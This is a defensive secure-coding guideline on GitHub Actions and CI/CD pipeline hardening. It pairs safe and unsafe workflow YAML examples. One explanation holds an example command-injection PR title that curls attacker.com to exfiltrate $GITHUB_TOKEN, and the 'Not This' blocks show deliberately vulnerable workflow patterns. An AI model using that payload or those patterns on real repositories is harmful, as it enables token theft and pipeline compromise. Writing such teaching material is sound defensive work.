---
id: devops-cicd-security
title: CI/CD Pipeline Security
scope: devops
severity: critical
tags: [security, cicd, github-actions, pipeline, secrets, supply-chain, slsa, provenance, artifact-signing]
references:
  - title: "OWASP CI/CD Security Top 10"
    url: https://owasp.org/www-project-top-10-ci-cd-security-risks/
  - title: "tj-actions/changed-files CVE-2025-30066"
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-30066
  - title: "GitHub — Security Hardening for GitHub Actions"
    url: https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
  - title: "SLSA — Supply-chain Levels for Software Artifacts"
    url: https://slsa.dev/
  - title: "GitHub — Security Hardening — Using pull_request_target"
    url: https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
---

## Principle

A CI/CD pipeline has the keys to the kingdom — it can read secrets, push to production, and modify infrastructure. Every workflow file is executable code that runs with elevated privileges. A compromised pipeline compromises everything it can deploy. Pin dependencies, scope permissions to the minimum, treat pipeline config as security-critical code, and never trust user-controlled input in execution contexts.

## Rules

### Dependency Pinning

1. **Pin GitHub Actions to full commit SHAs, not tags or branches.** Tags are mutable — a compromised tag can inject malicious code into every repo using it (tj-actions CVE-2025-30066). Pin to the full 40-character commit SHA. Add a comment with the version for readability.

### Permissions

2. **Use minimum-required permissions for workflow tokens.** Set `permissions: {}` at the workflow level, then grant only what each job needs (e.g., `contents: read`, `pull-requests: write`). The default GITHUB_TOKEN has write access to the repo — always scope it down.

### Input Handling

3. **Never use user input in `run:` expressions without sanitization.** PR titles, branch names, issue bodies, and commit messages are attacker-controlled. Using `${{ github.event.pull_request.title }}` in a `run:` step enables command injection. Write inputs to a file or use an intermediate environment variable set via `$GITHUB_ENV`.

### Authentication

4. **Use OIDC for cloud authentication instead of long-lived secrets.** GitHub Actions supports OIDC token exchange with AWS, GCP, and Azure. This eliminates the need to store cloud credentials as repository secrets. OIDC tokens are short-lived and scoped to specific workflow runs.

### Secrets Hygiene

5. **Never print, echo, or log secrets.** Even with masking, secrets can leak via debug logging, error messages, or redirect to files. Use secret managers that inject values at runtime. Audit workflow logs for accidental exposure.

### Code Integrity

6. **Require signed commits for protected branches.** Configure branch protection to require verified commit signatures. This prevents an attacker who gains repo write access from injecting unsigned malicious commits.

7. **Treat pipeline configuration as code — review all changes.** Require PR reviews for changes to `.github/workflows/`, `Jenkinsfile`, `.gitlab-ci.yml`, and similar pipeline configs. A malicious pipeline change can exfiltrate secrets, modify deployments, or compromise the supply chain.

### Supply Chain Integrity

8. **Sign build artifacts and generate provenance attestations.** Sign build artifacts (binaries, packages, container images) and generate provenance attestations documenting the build process. Use SLSA GitHub generator or cosign for attestation. Verify signatures before deployment. This ensures that artifacts have not been tampered with between build and deploy. Target SLSA Level 2+ for production artifacts.

9. **Never checkout PR head ref in `pull_request_target` workflows.** `pull_request_target` runs with the base branch's secrets and permissions but can be triggered by fork PRs. If the workflow checks out the PR head, the fork's code runs with access to repository secrets. Use `pull_request` trigger for code-executing workflows. Use `pull_request_target` only for metadata operations (labeling, commenting) that never execute PR code. (CWE-829)

## Patterns

### Secure GitHub Actions Workflow

#### Do This

```yaml
name: CI
on:
  pull_request:
    branches: [main]

# Deny all permissions by default
permissions: {}

jobs:
  build:
    runs-on: ubuntu-latest
    # Grant only what this job needs
    permissions:
      contents: read
      pull-requests: write

    steps:
      # Pinned to full SHA — immutable reference
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.6

      - name: Run tests
        run: npm test

      # Safe input handling — write to env var, not inline in run
      - name: Comment on PR
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Processing PR: $PR_TITLE"
```

#### Not This

```yaml
name: CI
on:
  pull_request:
    branches: [main]

# No permissions block — uses broad defaults (contents: write, etc.)

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Tag reference — mutable, can be hijacked
      - uses: actions/checkout@v4

      # Command injection — attacker controls PR title
      - name: Comment on PR
        run: |
          echo "Processing: ${{ github.event.pull_request.title }}"
```

**Why it's wrong:** Three problems: (1) No `permissions` block — the GITHUB_TOKEN gets broad default permissions including write access to repo contents. (2) Tag-based action reference — `@v4` is mutable, and a compromised tag silently replaces the action code in every workflow using it (this is exactly how CVE-2025-30066 worked). (3) `${{ github.event.pull_request.title }}` is injected directly into a `run:` step — an attacker can set the PR title to `"; curl attacker.com/steal?t=$GITHUB_TOKEN; echo "` and exfiltrate the token.

### OIDC Authentication with AWS

#### Do This

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write   # Required for OIDC
      contents: read

    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy-role
          aws-region: us-east-1
          # No access keys — uses OIDC token exchange
```

#### Not This

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          # Long-lived credentials stored as repo secrets
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: us-east-1
```

**Why it's wrong:** Long-lived AWS credentials stored as repository secrets can be exfiltrated by any workflow that reads secrets. If the secret leaks (via logs, a compromised action, or a fork PR), the attacker has persistent access until the key is rotated. OIDC tokens are short-lived (minutes), scoped to specific workflow runs, and never stored anywhere.

### SLSA Provenance Attestation

#### Do This

```yaml
# GitHub Actions — generate SLSA provenance for container images
name: Release
on:
  push:
    tags: ["v*"]

permissions: {}

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write  # Required for signing
    outputs:
      digest: ${{ steps.push.outputs.digest }}

    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.6

      - name: Build and push image
        id: push
        run: |
          docker build -t ghcr.io/myorg/myapp:${{ github.ref_name }} .
          docker push ghcr.io/myorg/myapp:${{ github.ref_name }}
          # Capture the image digest for provenance attestation
          DIGEST=$(docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/myorg/myapp:${{ github.ref_name }} | cut -d@ -f2)
          echo "digest=$DIGEST" >> "$GITHUB_OUTPUT"

      # Sign with cosign and attach SLSA provenance
      - uses: sigstore/cosign-installer@dc72c7d5c4d10cd6bcb8cf6e3fd625a9e5e537da # v3.7.0
      - name: Sign image
        run: cosign sign ghcr.io/myorg/myapp:${{ github.ref_name }}
        env:
          COSIGN_EXPERIMENTAL: "true"  # Keyless signing via Fulcio

  provenance:
    needs: build
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v2.0.0
    with:
      image: ghcr.io/myorg/myapp
      digest: ${{ needs.build.outputs.digest }}
```

#### Not This

```yaml
# No signing, no provenance — deploy whatever the build produces
jobs:
  deploy:
    steps:
      - run: docker build -t myapp:latest . && docker push myapp:latest
      # No signature — anyone with registry write access can replace the image
      # No provenance — no proof this artifact came from this repo's CI
```

**Why it's wrong:** Without artifact signing, a compromised registry or CI runner can inject malicious artifacts that look identical to legitimate ones. Without provenance attestation, there is no verifiable record of which source code, build process, and CI environment produced the artifact. SLSA provenance creates a tamper-proof chain from source to deployment.

### Restricting pull_request_target

#### Do This

```yaml
# Safe: pull_request_target only reads metadata, never checks out PR code
name: Label PR
on:
  pull_request_target:
    types: [opened]

permissions: {}

jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      # Only read PR metadata — never checkout PR head code
      - name: Add label
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
        with:
          script: |
            await github.rest.issues.addLabels({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              labels: ['needs-review']
            })

---
# Safe: use pull_request trigger for workflows that execute code
name: CI
on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.6
      - run: npm test
```

#### Not This

```yaml
# DANGEROUS: pull_request_target checks out fork PR code with base branch secrets
name: CI
on:
  pull_request_target:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # Fork's code now runs with access to repository secrets
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test  # Attacker's code runs with your secrets
```

**Why it's wrong:** `pull_request_target` runs with the base branch's workflow definition and has access to repository secrets. Checking out the PR head ref (`github.event.pull_request.head.sha`) means a fork's malicious code executes with full secret access. The attacker can exfiltrate `GITHUB_TOKEN`, deployment keys, and any other repository secrets. Use `pull_request` trigger for any workflow that executes code from the PR.

## Exceptions

- First-party actions maintained by the repository itself may use branch references, since the code is in the same trust boundary.
- Internal actions in a private GitHub Enterprise instance with strict access controls may relax SHA pinning, but should still pin to tags at minimum.

## Cross-References

- [Security](core-security) — Secrets management (R4)
- [Dependency Management](core-dependency-management) — Supply chain verification
- [DevOps Container Security](devops-container-security) — Image scanning in CI
